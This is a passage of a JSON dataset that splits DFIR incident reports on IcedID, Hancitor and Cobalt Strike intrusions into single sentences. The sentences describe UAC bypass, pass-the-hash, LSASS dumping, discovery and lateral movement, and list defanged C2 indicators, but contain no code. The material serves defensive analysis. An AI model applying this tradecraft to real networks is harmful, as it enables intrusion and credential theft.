        "text": "The HTA file when executed downloads a file named \u201ctextboxNameNamespace.jpg\u201d, which is actually an IcedID DLL file responsible for the first stage.",
        "type": "",
        "report": "r-dfir-27",
        "line": 21,
        "index": 6386
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S22",
        "text": "Through the same HTA file, the IcedID first stage DLL file is executed via regsvr32.exe.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 22,
        "index": 6387
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S23",
        "text": "IcedID executes via rundll32, dropping DLL files related to both the IcedID second stage and Cobalt Strike beacons.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 23,
        "index": 6388
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S24",
        "text": "After the initial compromise, the threat actors went silent for eleven days.",
        "type": "",
        "report": "r-dfir-27",
        "line": 24,
        "index": 6389
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S25",
        "text": "After that period of time, a new Cobalt Strike beacon was run through IcedID and sent forth to a second phase of their activities.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 25,
        "index": 6390
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S26",
        "text": "IcedID establishes persistence on the compromised host using a scheduled task named \u2018{0AC9D96E-050C-56DB-87FA-955301D93AB5}\u2019 that executes its second stage.",
        "type": "",
        "report": "r-dfir-27",
        "line": 26,
        "index": 6391
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S27",
        "text": "This scheduled task was observed to be executing hourly under the initially compromised user.",
        "type": "",
        "report": "r-dfir-27",
        "line": 27,
        "index": 6392
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S28",
        "text": "Ekix4.dll, a Cobalt Strike payload was executed via fodhelper UAC bypass.",
        "type": "",
        "report": "r-dfir-27",
        "line": 28,
        "index": 6393
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S29",
        "text": "Additional Cobalt Strike payloads were executed with the same fodhelper UAC bypass technique.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 29,
        "index": 6394
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S30",
        "text": "Cobalt Strike payloads were used to escalate privileges to SYSTEM via a service created to run a payload using rundll32.exe as the LocalSystem user.",
        "type": "",
        "report": "r-dfir-27",
        "line": 30,
        "index": 6395
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S31",
        "text": "This activity was observed on workstations, a file server, and a backup server.",
        "type": "",
        "report": "r-dfir-27",
        "line": 31,
        "index": 6396
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S32",
        "text": "GetSystem was also used by the threat actors.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 32,
        "index": 6397
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S33",
        "text": "The threat actors were seen using overpass the hash to elevate privileges in the Active Directory environment via Mimikatz style pass the hash logon events, followed by subsequent suspect Kerberos ticket requests matching network alert signatures.",
        "type": "",
        "report": "r-dfir-27",
        "line": 33,
        "index": 6398
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S34",
        "text": "ATTACK [PTsecurity] Overpass the hash.",
        "type": "",
        "report": "r-dfir-27",
        "line": 34,
        "index": 6399
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S35",
        "text": "Encryption downgrade activity to ARCFOUR-HMAC-MD5\",10002228\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 35,
        "index": 6400
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S36",
        "text": "Using these credentials, the threat actors attempted to use a Cobalt Strike beacon injected into the LSASS process to execute WMIC, which executed ProcDump on a remote system to dump credentials.",
        "type": "",
        "report": "r-dfir-27",
        "line": 36,
        "index": 6401
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S37",
        "text": "This activity appears to have failed due to Windows Defender activity.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 37,
        "index": 6402
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S38",
        "text": "IcedID initially performed some discovery of the local system and the domain.",
        "type": "",
        "report": "r-dfir-27",
        "line": 38,
        "index": 6403
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S39",
        "text": "Later, Cobalt Strike beacons were used to perform discovery of the system and domain.",
        "type": "",
        "report": "r-dfir-27",
        "line": 39,
        "index": 6404
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S40",
        "text": "A discovery batch script that runs ADFind.exe was dropped to the system.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 40,
        "index": 6405
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S41",
        "text": "ADFind.exe was executed by the discovery batch script.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 41,
        "index": 6406
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S42",
        "text": "PowerView was used to discover local administrator access in the network.",
        "type": "",
        "report": "r-dfir-27",
        "line": 42,
        "index": 6407
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S43",
        "text": "The Cobalt Strike beacon itself was used as a proxy to connect and retrieve the PowerView file.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 43,
        "index": 6408
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S44",
        "text": "Cobalt Strike was injected into the winlogon.exe process and used to perform further discovery.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 44,
        "index": 6409
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S45",
        "text": "The following shows the decoded PowerShell commands used by Cobalt Strike to perform discovery.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 45,
        "index": 6410
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S46",
        "text": "Lateral Movement chain #1 \u2013 The attacker was able to successfully move from workstation #1 to workstation #2 via service execution.",
        "type": "",
        "report": "r-dfir-27",
        "line": 46,
        "index": 6411
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S47",
        "text": "The attacker tried to replicate this movement technique towards two servers but were stopped when their Cobalt Strike PowerShell payloads were nabbed by AV.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 47,
        "index": 6412
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S48",
        "text": "Lateral Movement chain #2 \u2013",
        "type": "",
        "report": "r-dfir-27",
        "line": 48,
        "index": 6413
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S49",
        "text": "Another attempt was made to move from workstation #1 to one of the servers, but this attempt was also thwarted by AV.",
        "type": "",
        "report": "r-dfir-27",
        "line": 49,
        "index": 6414
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S50",
        "text": "Just like the previous attempt, a remote service was created, however, this time a DLL payload was used rather than a PowerShell payload.",
        "type": "",
        "report": "r-dfir-27",
        "line": 50,
        "index": 6415
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S51",
        "text": "Lateral Movement chain #3 \u2013 Privileges were escalated to SYSTEM on Workstation #1 via the Cobalt Strike \u2018GetSystem\u2019 command which makes use of named pipes.",
        "type": "",
        "report": "r-dfir-27",
        "line": 51,
        "index": 6416
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S52",
        "text": "A Cobalt Strike DLL was copied to a server and executed using WMI.",
        "type": "",
        "report": "r-dfir-27",
        "line": 52,
        "index": 6417
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S53",
        "text": "This activity was observed on three servers, including the Domain Controller.",
        "type": "",
        "report": "r-dfir-27",
        "line": 53,
        "index": 6418
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S54",
        "text": "The logs demonstrate multiple connections from IcedID to their C2 servers, including aws.amazon[.]com for connectivity checks.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 54,
        "index": 6419
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S55",
        "text": "The Cobalt Strike beacons also make use of multiple C2 servers on the public internet.\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 55,
        "index": 6420
    },
    {
        "id": "dfir-reports-filtered/r-dfir-27.md:::S56",
        "text": "Cobalt Strike Configs:\n",
        "type": "",
        "report": "r-dfir-27",
        "line": 56,
        "index": 6421
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S0",
        "text": "In this short intrusion, the threat actor gained initial access on a system through a maldoc campaign which made use of the Hancitor downloader.",
        "type": "",
        "report": "r-dfir-28",
        "line": 0,
        "index": 6422
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S1",
        "text": "The first-stage DLL, which was dropped by a malicious Word document, attempted to download multiple malware payloads on the beachhead system, including Ficker Stealer.",
        "type": "",
        "report": "r-dfir-28",
        "line": 1,
        "index": 6423
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S2",
        "text": "In addition, a Cobalt Strike beacon payload was downloaded, and deployed to perform post-exploitation activities.",
        "type": "",
        "report": "r-dfir-28",
        "line": 2,
        "index": 6424
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S3",
        "text": "Once inside the target environment, port scans and a large amount of ICMP traffic was observed\u2013to identify additional active systems.",
        "type": "",
        "report": "r-dfir-28",
        "line": 3,
        "index": 6425
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S4",
        "text": "After about 20 minutes, the threat actor copied a batch script file and DLL file to another system using the SMB protocol.",
        "type": "",
        "report": "r-dfir-28",
        "line": 4,
        "index": 6426
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S5",
        "text": "A remote service was installed to start the batch file, which executed the Cobalt Strike shellcode-embedded DLL.",
        "type": "",
        "report": "r-dfir-28",
        "line": 5,
        "index": 6427
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S6",
        "text": "On the second compromised system, various discovery-related commands were executed before going silent.",
        "type": "",
        "report": "r-dfir-28",
        "line": 6,
        "index": 6428
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S7",
        "text": "The threat actors were evicted before completing their mission.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 7,
        "index": 6429
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S8",
        "text": "The Hancitor malware was embedded in a macro-based Word document.",
        "type": "",
        "report": "r-dfir-28",
        "line": 8,
        "index": 6430
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S9",
        "text": "This single-paged document contained a picture with instructions, attempting to lure the victim into enabling macros.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 9,
        "index": 6431
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S10",
        "text": "When the macro was enabled, the infection chain started, and the first-stage Hancitor DLL was dropped to disk.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 10,
        "index": 6432
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S11",
        "text": "Reviewing the macro we can see that in sub yyy (towards the bottom) content within the document is being copied and used to create a file object by sub xxx which then is executed by the shell call to rundll32.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 11,
        "index": 6433
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S12",
        "text": "Looking at the strings of the word document, we can see that there\u2019s an embedded OLE object, which appears to be a PE file.",
        "type": "",
        "report": "r-dfir-28",
        "line": 12,
        "index": 6434
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S13",
        "text": "The malicious Hancitor DLL in the OLE object, named \u201crem.r\u201d, was executed via rundll32.exe by passing the entry point \u201cESLMJYVFM\u201d.",
        "type": "",
        "report": "r-dfir-28",
        "line": 13,
        "index": 6435
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S14",
        "text": "The botnet ID and C2 were extracted using Hatching Triage:\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 14,
        "index": 6436
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S15",
        "text": "Later on in the intrusion, the threat actor used the following command to execute a Cobalt Strike Beacon on another machine:\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 15,
        "index": 6437
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S16",
        "text": "On the beachhead system, the malicious Hancitor DLL injected into the svchost.exe process.",
        "type": "",
        "report": "r-dfir-28",
        "line": 16,
        "index": 6438
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S17",
        "text": "The code was injected into multiple instances of svchost.exe.",
        "type": "",
        "report": "r-dfir-28",
        "line": 17,
        "index": 6439
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S18",
        "text": "Memory analysis also shows suspicious memory protections (page_execute_readwrite) and regions of the particular process.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 18,
        "index": 6440
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S19",
        "text": "Finally, when looking at the process tree, we can identify the unusual parent-child process relationship of rundll32.exe starting svchost.exe.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 19,
        "index": 6441
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S20",
        "text": "The svchost.exe process, in turn, injected a Cobalt Strike beacon into multiple rundll32.exe instances.",
        "type": "",
        "report": "r-dfir-28",
        "line": 20,
        "index": 6442
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S21",
        "text": "One of the injected rundll32.exe instance was also observed connecting to the Cobalt Strike C2 server.",
        "type": "",
        "report": "r-dfir-28",
        "line": 21,
        "index": 6443
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S22",
        "text": "In addition, the malicious 95.dll, which was observed during the lateral movement phase, is also designed to evade automated sandbox analysis.",
        "type": "",
        "report": "r-dfir-28",
        "line": 22,
        "index": 6444
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S23",
        "text": "This DLL is crafted in such a way that it wouldn\u2019t show malicious behavior if an exported function is not called by passing a specific parameter.",
        "type": "",
        "report": "r-dfir-28",
        "line": 23,
        "index": 6445
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S24",
        "text": "The DLL contains the Cobalt Strike shellcode and will only execute if the \u201c11985756\u201d parameter is passed to the TstSec function.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 24,
        "index": 6446
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S25",
        "text": "After extracting the Cobalt Strike shellcode from 95.dll and emulating it via scdbg, we found that it\u2019s connecting to 162.244.83[.]95 over port 8080.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 25,
        "index": 6447
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S26",
        "text": "Since 95.dll was executed by rundll32.exe, and from the host logs, it is evident that rundll32.exe connected to 162.244.83[.]95 over port 8080.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 26,
        "index": 6448
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S27",
        "text": "Packet analysis to the IP address mentioned above, shows that it\u2019s downloading the Cobalt Strike beacon by initiating a HTTP GET request to /hVVH URI.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 27,
        "index": 6449
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S28",
        "text": "Once downloaded, the stager allocates a new memory region inside the current rundll32.exe process and loads it into the memory and starts the C2 activity.",
        "type": "",
        "report": "r-dfir-28",
        "line": 28,
        "index": 6450
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S29",
        "text": "On the beachhead system, the threat actor started exploring their options to move laterally within the target network.",
        "type": "",
        "report": "r-dfir-28",
        "line": 29,
        "index": 6451
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S30",
        "text": "The logged-on user account was utilized to interact with IPC$ shares.",
        "type": "",
        "report": "r-dfir-28",
        "line": 30,
        "index": 6452
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S31",
        "text": "For one specific system, for which the threat actor showed interest, the contents of the C$ share was listed\u2013we assess, to verify if the account had access permissions to the share before copying the malware to it:\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 31,
        "index": 6453
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S32",
        "text": "The threat actor also pinged one of the Active Directory domain controllers from the beachhead machine.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 32,
        "index": 6454
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S33",
        "text": "A high amount of ICMP traffic, targeting various Class-A subnets ranges, was observed and used to identify other active systems within the environment.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 33,
        "index": 6455
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S34",
        "text": "On the second system, to which the adversary laterally moved (see section below), the following discovery commands were executed:\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 34,
        "index": 6456
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S35",
        "text": "The injected svchost process dropped two files: a batch-file named: \u201c95.bat\u201d and a DLL-file named: \u201c95.dll\u201d.",
        "type": "",
        "report": "r-dfir-28",
        "line": 35,
        "index": 6457
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S36",
        "text": "Both files were copied to the ProgramData folder of another system within the environment.",
        "type": "",
        "report": "r-dfir-28",
        "line": 36,
        "index": 6458
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S37",
        "text": "The content of the batch file can be seen below\u2013it executes the transferred DLL and then deletes itself:\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 37,
        "index": 6459
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S38",
        "text": "To execute the batch file, the threat actor installed, and started, a remote service on the other system.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 38,
        "index": 6460
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S39",
        "text": "An attempt to open lsass.exe process was observed on the system where lateral movement occurred but there were no signs of successful read attempts.\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 39,
        "index": 6461
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S40",
        "text": "In the network traffic, we can identify a data stream pattern that is distinctive to Hancitor malware.",
        "type": "",
        "report": "r-dfir-28",
        "line": 40,
        "index": 6462
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S41",
        "text": "First, the malware performed a lookup of the external IP-address of the infected system (1).",
        "type": "",
        "report": "r-dfir-28",
        "line": 41,
        "index": 6463
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S42",
        "text": "This was followed by Hancitor C2 traffic, sent via HTTP POST requests, which included unique attributes of the infected system, such as hostname and username information (2).",
        "type": "",
        "report": "r-dfir-28",
        "line": 42,
        "index": 6464
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S43",
        "text": "Hancitor then attempted to download additional malware.",
        "type": "",
        "report": "r-dfir-28",
        "line": 43,
        "index": 6465
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S44",
        "text": "This included the info-stealer known as \u201cFicker Stealer\u201d (4), for which the DNS traffic corresponds to a recent article posted by Brad.",
        "type": "",
        "report": "r-dfir-28",
        "line": 44,
        "index": 6466
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S45",
        "text": "However, in our case, the post infection HTTP traffic of Ficker Stealer was not observed.",
        "type": "",
        "report": "r-dfir-28",
        "line": 45,
        "index": 6467
    },
    {
        "id": "dfir-reports-filtered/r-dfir-28.md:::S46",
        "text": "Hancitor also attempted to download Cobalt Strike stagers (.bin files) (3), and Cobalt Strike traffic was sent both encrypted and unencrypted (5).\n",
        "type": "",
        "report": "r-dfir-28",
        "line": 46,
        "index": 6468
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S0",
        "text": "We assess with medium confidence that the initial IcedID infection was delivered via a malspam campaign, which included an attachment with a password protected zip archive.",
        "type": "",
        "report": "r-dfir-29",
        "line": 0,
        "index": 6469
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S1",
        "text": "Once extracted, the user would find a Word document with a macro, which upon execution, would deliver the initial DLL loader.",
        "type": "",
        "report": "r-dfir-29",
        "line": 1,
        "index": 6470
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S2",
        "text": "Discovered in 2017, what started as a commodity malware, IcedID is now currently being deployed as an initial access broker by ransomware threat actors.",
        "type": "",
        "report": "r-dfir-29",
        "line": 2,
        "index": 6471
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S3",
        "text": "In this case, the threat actor appeared to have specific goals, and did not waste any time.",
        "type": "",
        "report": "r-dfir-29",
        "line": 3,
        "index": 6472
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S4",
        "text": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
        "type": "",
        "report": "r-dfir-29",
        "line": 4,
        "index": 6473
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S5",
        "text": "The first task of the threat actor was to enumerate the network by establishing a list of the domain admins using living off the land techniques, such as net.exe.",
        "type": "",
        "report": "r-dfir-29",
        "line": 5,
        "index": 6474
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S6",
        "text": "A freely available tool Adfind.exe was also utilized to further enumerate the domain.",
        "type": "",
        "report": "r-dfir-29",
        "line": 6,
        "index": 6475
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S7",
        "text": "The threat actor was also observed stealing credentials from the lsass.exe process.",
        "type": "",
        "report": "r-dfir-29",
        "line": 7,
        "index": 6476
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S8",
        "text": "Five minutes after the above discovery activity, we observed the actors moving laterally to other hosts on the network with the credentials of a domain administrator account.",
        "type": "",
        "report": "r-dfir-29",
        "line": 8,
        "index": 6477
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S9",
        "text": "In this case, Cobalt Strike was also used to create the administrative token, and attempted to install a service using a windows service executable.",
        "type": "",
        "report": "r-dfir-29",
        "line": 9,
        "index": 6478
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S10",
        "text": "The service was tasked to run an encoded PowerShell command which would download and execute the Cobalt Strike beacon over HTTP.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 10,
        "index": 6479
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S11",
        "text": "Based on the name of the hosts that the threat actors decided to pivot, we judge that they were able to digest the \u2018AdFind\u2019 results and focus on, what they believed to be, important targets \u2013 critical assets such as file servers, domain controllers, etc.",
        "type": "",
        "report": "r-dfir-29",
        "line": 11,
        "index": 6480
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S12",
        "text": "It is also worth mentioning that even after the unsuccessful remote execution attempt against a few servers due to AV, the actors decided to connect via RDP and spend over an hour looking for valuable data before disconnecting and leaving the network.",
        "type": "",
        "report": "r-dfir-29",
        "line": 12,
        "index": 6481
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S13",
        "text": "No exfiltration of data or impact to the systems was observed but at least one command and control.",
        "type": "",
        "report": "r-dfir-29",
        "line": 13,
        "index": 6482
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S14",
        "text": "It is unclear why the actors decided not to continue with their operation.",
        "type": "",
        "report": "r-dfir-29",
        "line": 14,
        "index": 6483
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S15",
        "text": "No attempt was made to clean up the intrusion by the actors \u2013 artifacts that were deployed were still in operation, including C2 implants.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 15,
        "index": 6484
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S16",
        "text": "The first stage of the IcedID malware that was executed on the host was dropped via a macro enabled Word document \u2013 as seen by Unit42.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 16,
        "index": 6485
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S17",
        "text": "IOCs from Brad here.",
        "type": "",
        "report": "r-dfir-29",
        "line": 17,
        "index": 6486
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S18",
        "text": "In our case, the IcedID dll loader was manually executed using regsvr32.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 18,
        "index": 6487
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S19",
        "text": "From the initial access, a scheduled task was created.",
        "type": "",
        "report": "r-dfir-29",
        "line": 19,
        "index": 6488
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S20",
        "text": "This can be observed by EventID 106: New task registered:\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 20,
        "index": 6489
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S21",
        "text": "Inspection of the task file located under \u2018c:\\windows\\system32\\tasks\u2019:\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 21,
        "index": 6490
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S22",
        "text": "\u2018License.dat\u2019 is an encrypted binary file and is a tell-tale indication of an IcedID compromise.",
        "type": "",
        "report": "r-dfir-29",
        "line": 22,
        "index": 6491
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S23",
        "text": "The corresponding DLL (upefkuin4.dll) is used with license.dat to maintain persistence using the Task Scheduler.",
        "type": "",
        "report": "r-dfir-29",
        "line": 23,
        "index": 6492
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S24",
        "text": "After decrypting License.dat using Binary Defense\u2019s decryption tool, we can see some information stealing functionality:\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 24,
        "index": 6493
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S25",
        "text": "EventID 200: Task executed shows the persistent IcedID core being executed, on average every 1 hour via Rundll32.exe.",
        "type": "",
        "report": "r-dfir-29",
        "line": 25,
        "index": 6494
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S26",
        "text": "The LSASS process was accessed by an unusual process \u201cwuauclt.exe\u201d on the beachhead host.",
        "type": "",
        "report": "r-dfir-29",
        "line": 26,
        "index": 6495
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S27",
        "text": "This was the Cobalt Strike Beacon and was used to access the credentials.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 27,
        "index": 6496
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S28",
        "text": "This is not the first time we have observed this process (wuauclt.exe) being used.",
        "type": "",
        "report": "r-dfir-29",
        "line": 28,
        "index": 6497
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S29",
        "text": "In our previous report with another IcedID infection leading to Sodinokibi ransomware we also observed the same process being used.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 29,
        "index": 6498
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S30",
        "text": "The same process was also observed invoking PowerShell scripts:\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 30,
        "index": 6499
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S31",
        "text": "\u201cWuauclt.exe\u201d is normally used for the Microsoft Windows Update Service and this was an attempt to blend into the OS environment.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 31,
        "index": 6500
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S32",
        "text": "Discovery commands were run by IcedID during the initial execution on the beachhead.",
        "type": "",
        "report": "r-dfir-29",
        "line": 32,
        "index": 6501
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S33",
        "text": "These commands use the Microsoft Windows built-in commands and utilities, such as WMIC, ipconfig, etc.",
        "type": "",
        "report": "r-dfir-29",
        "line": 33,
        "index": 6502
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S34",
        "text": "The aim was to determine the installed Anti-virus software, network configuration, domain configuration and user accounts.",
        "type": "",
        "report": "r-dfir-29",
        "line": 34,
        "index": 6503
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S35",
        "text": "The following are the commands that were executed:\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 35,
        "index": 6504
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S36",
        "text": "Using the information gathered, the IcedID operator was able to focus on specific targets, obtaining access to the privileged accounts and the high value hosts.",
        "type": "",
        "report": "r-dfir-29",
        "line": 36,
        "index": 6505
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S37",
        "text": "Once the IcedID operators were able to establish a C2 session to the initial compromised host, the operators were observed executing the following command:\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 37,
        "index": 6506
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S38",
        "text": "Interestingly, we observed the operator deploying and utilizing AdFind to collect information about the hosts on the network.",
        "type": "",
        "report": "r-dfir-29",
        "line": 38,
        "index": 6507
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S39",
        "text": "AdFind is an Active Directory query tool developed by JoeWare, a useful utility for system administrators, but also popular among threat actors.",
        "type": "",
        "report": "r-dfir-29",
        "line": 39,
        "index": 6508
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S40",
        "text": "AdFind was transferred and executed on the beachhead host.",
        "type": "",
        "report": "r-dfir-29",
        "line": 40,
        "index": 6509
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S41",
        "text": "The threat actor placed the AdFind binary and the results in the \u2018C:\\Recovery\u2019 folder.",
        "type": "",
        "report": "r-dfir-29",
        "line": 41,
        "index": 6510
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S42",
        "text": "We assess this folder location was chosen to avoid raising suspicion, as compared to executing from a user or temporary folder location.",
        "type": "",
        "report": "r-dfir-29",
